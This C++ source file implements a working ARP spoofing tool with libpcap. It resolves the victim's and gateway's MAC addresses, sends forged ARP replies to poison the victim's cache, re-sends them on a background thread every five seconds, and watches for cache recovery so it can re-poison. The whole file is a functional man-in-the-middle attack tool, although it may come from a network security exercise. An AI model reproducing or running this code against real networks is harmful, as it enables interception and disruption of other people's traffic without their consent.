#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <unistd.h>
#include <cstring>
#include <string>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"
#include <iostream>
#include <thread>
#include <chrono>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void print_mac(const u_int8_t *m) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

void print_ip(struct in_addr *ip_addr) {
	printf("%s", inet_ntoa(*ip_addr));
}

bool getMyAddr(const char* dev, Mac& my_mac, Ip& my_ip) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return false;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    // Get MAC address
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR");
        close(sockfd);
        return false;
    }

    my_mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    // Get IP address
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFADDR");
        close(sockfd);
        return false;
    }

    my_ip = Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));

    close(sockfd);
    return true;
}

EthArpPacket sendArp(pcap_t* handle, int op, Mac eth_dmac, Mac eth_smac, Mac arp_smac, Mac arp_tmac, Ip arp_sip, Ip arp_tip)
{
	struct EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (op == 1)
		packet.arp_.op_ = htons(ArpHdr::Request);
	else if (op == 2)
		packet.arp_.op_ = htons(ArpHdr::Reply);
	else
		printf("request or reply?\n");
	packet.arp_.smac_ = arp_smac;
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tip_ = htonl(arp_tip);
	
	// printf("sending arp target:  %s\n", std::string(arp_tip).c_str());
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle))    ;
		return packet;
	}
	return packet;
}	

Mac getSenderMac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip sender_ip)
{
	Mac sender_mac;
	while(true)
	{
		// Send normal arp packet to get sender mac addr
		struct EthArpPacket sendPacket = sendArp(handle, 1, Mac::broadcastMac(), my_mac, my_mac, Mac::nullMac(), my_ip, sender_ip);

		// receive reply packet and parse...
		struct pcap_pkthdr* header;
		const u_char* packet_data;
		int res = pcap_next_ex(handle, &header, &packet_data);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		if (header->caplen < sizeof(EthArpPacket))
			continue;

		struct EthArpPacket* resPacket = (struct EthArpPacket *)(packet_data);
		struct EthArpPacket* reqPacket = &sendPacket;

		// get sender mac
		if((reqPacket->eth_.smac_ == resPacket->eth_.dmac_) && (reqPacket->arp_.tip_ == resPacket->arp_.sip_))
		{
			sender_mac = resPacket->eth_.smac_;
			break;
		}
		else
			continue;
	}
	return sender_mac;
}

bool isRecovered(struct EthArpPacket *listen_hdr, Mac my_mac, Mac sender_mac, Mac target_mac)
{
	if((listen_hdr->eth_.dmac_ == my_mac) || (listen_hdr->eth_.smac_ == my_mac))
	{
		return false;
	}

	printf("smac: %s", std::string(listen_hdr->eth_.smac_).c_str());
	printf(" | dmac: %s", std::string(listen_hdr->eth_.dmac_).c_str());
	printf(" | type: %04x\n", ntohs(listen_hdr->eth_.type_));

	// sender2all(req)
	if((listen_hdr->eth_.dmac_ == Mac::broadcastMac()) && (listen_hdr->eth_.smac_ == sender_mac) && (listen_hdr->arp_.op_ == ArpHdr::Request))
	{
		printf("sender2all request arp\n");
		return true;
	}

	// target2sender(req)
	if((listen_hdr->eth_.dmac_ == sender_mac) && (listen_hdr->eth_.smac_ == target_mac) && (listen_hdr->arp_.op_ == ArpHdr::Request))
	{
		printf("target2sender request arp\n");
		return true;
	}

	// target2sender(res)
	if((listen_hdr->eth_.dmac_ == sender_mac) && (listen_hdr->eth_.smac_ == target_mac) && (listen_hdr->arp_.op_ == ArpHdr::Reply))
	{
		printf("target2sender reply arp\n");
		return true;
	}
	
	// sender2target
	if((listen_hdr->eth_.dmac_ == target_mac) && (listen_hdr->eth_.smac_ == sender_mac))
	{
		printf("sender2target\n");
		return true;
	}
	return false;
}

void bgSendArp(pcap_t* handle, Mac sender_mac, Mac my_mac, Ip sender_ip, Ip target_ip)
{
	// Setting the thread as a daemon thread
    pthread_setcancelstate(PTHREAD_CANCEL_DISABLE, NULL);
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);

	while (true)
	{
		// Sending arp spoofing to target
		printf("======================\n");
		printf("[Sending Spoof Packet Background]\n");
		sendArp(handle, 2, sender_mac, my_mac, my_mac, sender_mac, target_ip, sender_ip);
		printf("-> done\n");

		// Wait for some time before sending the next spoof packet
		std::this_thread::sleep_for(std::chrono::seconds(5)); // Adjust the interval as needed
	}
}

int main(int argc, char* argv[])
{
    // Checking the arguments
    if (argc < 4 || (argc % 2 != 0)) {
        usage();
        return -1;
    }
    int iter = (argc - 2) / 2;

    // Get Host Information
    Mac my_mac;
    Ip my_ip;
    if (getMyAddr(argv[1], my_mac, my_ip)) {
		printf("[Host Info]\n");
        printf("interface: %s\n", argv[1]);
        printf("my MAC: %s\n", std::string(my_mac).c_str());
        printf("my IP: %s\n", std::string(my_ip).c_str());
    } else {
        fprintf(stderr, "cant get host info.\n");
        return -1;
    }
    
    // Open pcap
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
	fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
	return -1;
    }

	for (int i = 1; i <= iter; i++)
	{
		// Handling argument
        Ip sender_ip = Ip(argv[i * 2]);
        Ip target_ip = Ip(argv[i * 2 + 1]);
		Mac sender_mac;
		Mac target_mac;
		printf("======================\n");
		printf("[Sender & Target Info]\n");
		printf("sender ip: %s\n", std::string(sender_ip).c_str());
        printf("target ip: %s\n", std::string(target_ip).c_str());

		// Sending arp packet & Parsing sender mac
		sender_mac = getSenderMac(handle, my_mac, my_ip, sender_ip);
		target_mac = getSenderMac(handle, my_mac, my_ip, target_ip);
		printf("sender mac: %s\n", std::string(sender_mac).c_str());
		printf("target mac: %s\n", std::string(target_mac).c_str());		

		// Sending arp spoofing background
		std::thread spoofThread(bgSendArp, handle, sender_mac, my_mac, sender_ip, target_ip);

		// Sending arp spoofing to target
		printf("======================\n");
		printf("[Sending Spoof Packet]\n");
		sendArp(handle, 2, sender_mac, my_mac, my_mac, sender_mac, target_ip, sender_ip);
		printf("-> done\n");

		// listening the packet
		while(true)
		{
			struct pcap_pkthdr* listen_header;
			const u_char* listen_packet;
			int res = pcap_next_ex(handle, &listen_header, &listen_packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			struct EthArpPacket *listen_hdr = (struct EthArpPacket *)listen_packet;

			if(isRecovered(listen_hdr, my_mac, sender_mac, target_mac))
			{
				printf("need a infection\n");
				
				// Sending arp spoofing to target (reinfection)
				printf("======================\n");
				printf("[Sending Spoof Packet Again]\n");
				sendArp(handle, 2, sender_mac, my_mac, my_mac, sender_mac, target_ip, sender_ip);
				printf("-> done\n");
			}
		}
		spoofThread.detach();
	}
	pcap_close(handle);
    return 0;
}